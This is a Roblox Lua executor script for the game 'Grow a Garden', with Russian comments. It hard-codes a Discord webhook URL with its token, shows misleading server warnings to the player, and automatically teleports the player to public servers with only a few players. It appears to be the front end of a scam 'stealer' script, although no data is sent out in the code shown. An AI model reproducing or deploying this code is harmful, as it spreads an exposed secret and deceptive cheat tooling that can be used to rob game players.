if game.PlaceId ~= 126884695634066 then
    game.Players.LocalPlayer:Kick("⚠️ This script works only in Grow a Garden.")
    return
end


getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME







local teleportStarted = false -- в начало скрипта
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour

-- GUI предупреждение
local function createWarningGUI(text)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ServerWarningGUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.6, 0, 0.2, 0)
    frame.Position = UDim2.new(0.2, 0, 0.4, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.2
    frame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextStrokeTransparency = 0.8
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.Text = text
    label.Parent = frame
end

-- Проверка количества игроков
local playerCount = #Players:GetPlayers()
local needTeleport = false
local delayNeeded = false

if playerCount <= 2 then
    createWarningGUI("⚠️ You are on a private server.\nSwitch to a suitable server...")
    needTeleport = true
    delayNeeded = true
elseif playerCount >= 5 then
    createWarningGUI("⚠️ You are in a full server.\nSwitch to a suitable server...")
    needTeleport = true
    delayNeeded = true
else
    needTeleport = false -- Подходящий сервер, не телепортируемся, но продолжаем
end

-- Функция телепорта
function TPReturner()
    local Site
    if foundAnything == "" then
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end

    if Site.nextPageCursor then
        foundAnything = Site.nextPageCursor
    end

    for _, v in pairs(Site.data) do
        local ID = tostring(v.id)
        if tonumber(v.playing) >= 2 and tonumber(v.playing) < tonumber(v.maxPlayers) and not table.find(AllIDs, ID) and ID ~= game.JobId then
            table.insert(AllIDs, ID)
            task.wait()
            pcall(function()
                teleportStarted = true
                task.wait(0.2) -- Даём времени установиться переменной
                TeleportService:TeleportToPlaceInstance(PlaceID, ID, LocalPlayer)
            end)


            task.wait(0.1)
        end
    end
end

-- Цикл запуска
function Teleport()
    while not teleportStarted do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
                TPReturner()
            end
        end)
        task.wait()
    end
end


if needTeleport then
    task.spawn(Teleport)
    task.wait(9999)
end
